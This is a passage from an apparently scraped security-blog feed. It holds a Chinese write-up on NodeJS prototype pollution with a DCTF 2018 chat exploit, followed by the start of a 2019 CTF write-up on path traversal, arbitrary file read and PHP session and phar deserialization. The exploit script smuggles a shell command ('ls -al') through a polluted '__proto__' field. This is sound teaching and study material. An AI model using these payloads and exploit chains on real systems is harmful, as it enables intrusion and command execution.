class="string">"function (BAD_JSON, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, &#123;&#125;, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, &#123;&#125;, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, <span class="string">"__proto__.test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, <span class="string">"__proto__[test]"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(<span class="string">"__proto__.test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(<span class="string">"__proto__[test]"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, <span class="string">"__proto__"</span>, <span class="string">"test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_STRING, BAD_STRING, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(<span class="string">"__proto__"</span>, <span class="string">"test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_STRING, BAD_STRING, VALUE)"</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure></p><p>然后对一个库中所有函数进行测试，再进行检测：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (&#123;&#125;.test == <span class="string">"123"</span> || &#123;&#125;.test == <span class="number">123</span>) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="built_in">Object</span>.prototype.test;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>作者经过测试，得到了许多受原型链污染影响的库：<br><img src="/images/2019-12-07-11-18-38.png" alt=""><br>其中不乏我们经常在ctf中遇到的lodash……<br><img src="/images/2019-12-07-11-19-10.png" alt=""><br>而后，作者选取了几个典例进行分析。</p><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>例如代码中的第12行，存在漏洞点，其使用了lodash的merge，导致我们可以污染req对象，由于返回结果依赖于这个对象。那么如果攻击者input如下exp，每一条请求都将返回500：<br><img src="/images/2019-12-07-11-20-11.png" alt=""></p><h3 id="For-loop污染"><a href="#For-loop污染" class="headerlink" title="For-loop污染"></a>For-loop污染</h3><p>例如如下代码，我们可以进行原型污染，这样commands在下一次遍历时，就会遍历到我们加入的恶意值，进行任意命令执行。<br><img src="/images/2019-12-07-11-20-29.png" alt=""></p><h3 id="Property-injection"><a href="#Property-injection" class="headerlink" title="Property injection"></a>Property injection</h3><p>由于NodeJS的http模块拥有多个同名header，我们可以对cookie进行污染，那么request.headers.cookie将变为我们的污染值，那么每一个访问者都会共享同一个cookie：<br><img src="/images/2019-12-07-11-20-58.png" alt=""></p><h2 id="CTF中的应用"><a href="#CTF中的应用" class="headerlink" title="CTF中的应用"></a>CTF中的应用</h2><p>看完了作者介绍的原型链污染攻击，我们来看一下其在CTF中的简单应用。<br>题目： <a href="https://chat.dctfq18.def.camp" target="_blank" rel="noopener">https://chat.dctfq18.def.camp</a><br>源码：<a href="https://dctf.def.camp/dctf-18-quals-81249812/chat.zip" target="_blank" rel="noopener">https://dctf.def.camp/dctf-18-quals-81249812/chat.zip</a><br>我们下载源码后，首先审计服务端代码：<br>看到在help.js中有如下高危代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getAscii: <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">    <span class="keyword">return</span> e.execSync(<span class="string">"cowsay '"</span> + message + <span class="string">"'"</span>).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们可控message，那么即可进行rce，例如：<br><img src="/images/2019-12-07-22-25-40.png" alt=""><br>于是在server.js中寻找调用点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">client.on(<span class="string">'join'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">channel</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientManager.joinChannel(client, channel);</span><br><span class="line">        sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">            <span class="string">"You joined channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">        <span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">        sendMessageToChannel(channel,<span class="string">"Server"</span>, </span><br><span class="line">            helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" joined channel"</span>))</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'leave'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">channel</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        client .join(channel);</span><br><span class="line">        clientManager.leaveChannel(client, channel);</span><br><span class="line">        sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">            <span class="string">"You left channel"</span>, channel)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line">        <span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line">        sendMessageToChannel(channel, <span class="string">"Server"</span>, </span><br><span class="line">            helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" left channel"</span>))</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>可以发现在join和leave用相应的调用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> u = clientManager.getUsername(client);</span><br><span class="line"><span class="keyword">var</span> c = clientManager.getCountry(client);</span><br><span class="line"></span><br><span class="line">sendMessageToChannel(channel,<span class="string">"Server"</span>, </span><br><span class="line">    helper.getAscii(<span class="string">"User "</span> + u + <span class="string">" living in "</span> + c + <span class="string">" joined channel"</span>))</span><br></pre></td></tr></table></figure></p><p>那么如果可控u和c，那么即可进行命令拼接，而u对于name，c对应country，对于name参数：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">validUser: <span class="function"><span class="keyword">function</span>(<span class="params">inp</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> block = [<span class="string">"source"</span>,<span class="string">"port"</span>,<span class="string">"font"</span>,<span class="string">"country"</span>,</span><br><span class="line">                     <span class="string">"location"</span>,<span class="string">"status"</span>,<span class="string">"lastname"</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> inp !== <span class="string">'object'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys( inp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; keys.length; i++) &#123;</span><br><span class="line">            key = keys[i];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(block.indexOf(key) !== <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> r =<span class="regexp">/^[a-z0-9]+$/gi</span>;</span><br><span class="line">        <span class="keyword">if</span>(inp.name === <span class="literal">undefined</span> || !r.test(inp.name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们发现我们被进行了大量过滤，很难直接进行任意命令执行，于是我们开始思考如何改变country的值，那么便容易想到使用原型链污染，在父类对象中加入country属性的值，进行污染。<br>那么我们可以从register进行输入：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">client.on(<span class="string">'register'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">inUser</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           newUser = helper.clone(<span class="built_in">JSON</span>.parse(inUser))</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(!helper.validUser(newUser)) &#123;</span><br><span class="line">               sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">                   <span class="string">'Invalid settings.'</span>)</span><br><span class="line">               <span class="keyword">return</span> client.disconnect();</span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(defaultSettings);</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; keys.length; ++i) &#123;</span><br><span class="line">               <span class="keyword">if</span>(newUser[keys[i]] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                   newUser[keys[i]] = defaultSettings[keys[i]]</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!clientManager.isUserAvailable(newUser.name)) &#123;</span><br><span class="line">               sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">                   newUser.name + <span class="string">' is not available'</span>)</span><br><span class="line">               <span class="keyword">return</span> client.disconnect(); </span><br><span class="line">           &#125;</span><br><span class="line">        </span><br><span class="line">           clientManager.registerClient(client, newUser)</span><br><span class="line">           <span class="keyword">return</span> sendMessageToClient(client,<span class="string">"Server"</span>, </span><br><span class="line">               newUser.name + <span class="string">' registered'</span>)</span><br><span class="line">       &#125; <span class="keyword">catch</span>(e) &#123; <span class="built_in">console</span>.log(e); client.disconnect() &#125;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></p><p>我们发现存在原型链污染漏洞点：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newUser = helper.clone(<span class="built_in">JSON</span>.parse(inUser))</span><br></pre></td></tr></table></figure></p><p>我们可以利用这里的clone，进行污染，达成目的。<br>构造如下exp：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> io = <span class="built_in">require</span>(<span class="string">'socket.io-client'</span>)</span><br><span class="line"><span class="keyword">const</span> socket = io.connect(<span class="string">'0.0.0.0:10000'</span>)</span><br><span class="line"></span><br><span class="line">socket.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'received socket error:'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(msg.from,<span class="string">"["</span>, msg.channel!==<span class="literal">undefined</span>?msg.channel:<span class="string">'Default'</span>,<span class="string">"]"</span>, <span class="string">"says:\n"</span>, msg.message);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">socket.emit(<span class="string">'register'</span>, <span class="string">`&#123;"name":"xxx", "__proto__":&#123;"country":"xxx';ls -al;echo 'xxx"&#125;&#125;`</span>);</span><br><span class="line">socket.emit(<span class="string">'message'</span>, <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">msg</span>: <span class="string">"hello"</span> &#125;));</span><br><span class="line">socket.emit(<span class="string">'join'</span>, <span class="string">'xxx'</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-22-57-41.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Prototype pollution attack还是一个比较有趣的攻击点，下次可以结合一些题目和CVE再做一些深入的了解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自于 NSEC 2018 ：Prototype pollution attack in NodeJS application
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 巅峰极客 Online WriteUp</title>
    <link href="http://skysec.top/2019/10/19/2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-Online-WriteUp/"/>
    <id>http://skysec.top/2019/10/19/2019-巅峰极客-Online-WriteUp/</id>
    <published>2019-10-19T02:49:24.000Z</published>
    <updated>2019-10-20T01:17:44.038Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lol"><a href="#lol" class="headerlink" title="lol"></a>lol</h2><p>拿到题目后，发现有一个上传页面：<br><img src="/images/2019-10-19-10-50-10.png" alt=""><br>点进去发现可控参数名较多，但最可疑的还是上传文件位置：<br><img src="/images/2019-10-19-10-50-21.png" alt=""><br>尝试上传一个文件，发现有两个路径，一个是upload，一个是download：<br><img src="/images/2019-10-19-10-51-20.png" alt=""><br>经过测试发现，文件名不是通过filename控制，而是通过phpsessionid控制：<br><img src="/images/2019-10-19-10-51-42.png" alt=""><br>尝试目录穿越，发现upload路径突然变成了绝对路径= =，估计代码哪里出现了问题：<br><img src="/images/2019-10-19-10-52-05.png" alt=""><br>同时访问文件，可以发现文件内容确实有写入：<br><img src="/images/2019-10-19-10-55-46.png" alt=""><br>然后就陷入了沉思，直到题目提示，注意download功能，又经过大量测试发现download功能的下载路径，是拼接了phpsessionid的路径的，于是我们首先创立upload目录：<br><img src="/images/2019-10-20-09-09-58.png" alt=""><br>然后进行任意源码读取：<br><img src="/images/2019-10-20-09-10-02.png" alt=""><br>我们可以通过该方法leak出整个网站的源码。<br>审计源码，发现可疑类：<code>Cache.class.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'name'</span>])?$data[<span class="string">'post'</span>][<span class="string">'name'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'message'</span>])?$data[<span class="string">'post'</span>][<span class="string">'message'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=!<span class="keyword">empty</span>($data[<span class="string">'image'</span>])?$data[<span class="string">'image'</span>]:<span class="string">'/static/images/pic04.jpg'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=Cache_DIR.DS.session_id().<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;html=sprintf(<span class="string">'&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset="utf-8" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;&lt;link rel="stylesheet" href="/static/css/main.css" /&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="/static/css/noscript.css" /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class="is-preload"&gt;&lt;div id="wrapper"&gt;&lt;header id="header"&gt; &lt;div class="logo"&gt;&lt;span class="icon fa-diamond"&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class="content"&gt;&lt;div class="inner"&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href="#you"&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id="main"&gt;&lt;article id="you"&gt;    &lt;h2 class="major" ng-app&gt;%s&lt;/h2&gt;    &lt;span class="image main"&gt;&lt;img src="%s" alt="" /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type="button" onclick=location.href="/download/%s"&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id="footer"&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src="/static/js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/browser.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/breakpoints.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/util.js"&gt;&lt;/script&gt;&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;&lt;script src="/static/js/angular.js"&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;'</span>,substr(<span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>],<span class="number">0</span>,<span class="number">62</span>),<span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>],<span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>],session_id().<span class="string">'.jpg'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现该类有任意文件写的功能，那么思考如何触发反序列化，这里可以用到Jarvis OJ / 2018 LCTF早就考过的考点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO</span><br><span class="line">https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge</span><br></pre></td></tr></table></figure></p><p>利用php session引擎的不同，进行反序列化，达成任意文件写入的目的：<br><img src="/images/2019-10-20-09-10-40.png" alt=""><br>最终可以getflag。</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>打开题目发现有3个功能：</p><ul><li>文件下载</li><li>文件上传</li><li>查看文件<br>依次打开，发现查看文件存在任意文件读取:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file.php?file=/var/www/html/index.php</span><br></pre></td></tr></table></figure></li></ul><p>通过如上方法拖出所有源码，审计代码，发现文件查看功能使用了类：<br><img src="/images/2019-10-19-14-03-56.png" alt=""><br>那么容易想到phar反序列化，因为file_exists可以触发phar反序列化，于是迅速查找类的定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    